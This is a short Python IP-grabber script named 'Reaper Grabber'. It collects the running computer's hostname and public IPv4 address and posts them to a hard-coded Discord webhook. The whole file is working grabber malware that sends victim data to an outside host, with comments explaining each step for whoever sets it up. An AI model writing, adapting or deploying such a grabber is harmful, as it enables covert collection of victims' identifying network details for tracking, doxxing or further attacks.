import requests
import socket

#! Made by https://github.com/nullylol/Reaper-Grabber

webhook = "https://discordapp.com/api/webhooks/726809766004916224/3CvVJeP_93PymzYcn1Y8wCYmjl6JHU2o-kRJq1yOFANAWsV4Qt25VBMsN7N70gM4JMYD" #!  Webhook goes here

def Collect():

    pcname = socket.gethostname() #! Grabs PC Name

    r = requests.get('https://ipv4bot.whatismyipaddress.com').text #! Visits IPV4 Website

    payloads = {
        "content" : f"```asciidoc\nGrabbed With Reaper Grabber.\nIP Report for :: {pcname}\nIPV4 :: {r}```", #! Don't touch anything here tbh
        "username" : "Reaper Grabber", #! Username for webhook
        "avatar_url" : "https://upload.wikimedia.org/wikipedia/commons/6/6a/Reaper.png", #! Profile Picture For Webhook (eg. https://www.ascii.wtf/ascii.png)
    }

    requests.post(webhook, data=payloads) #! Sends information (content) to the webhook

    quit() #! Quits the program
   
Collect() #! Starts the function
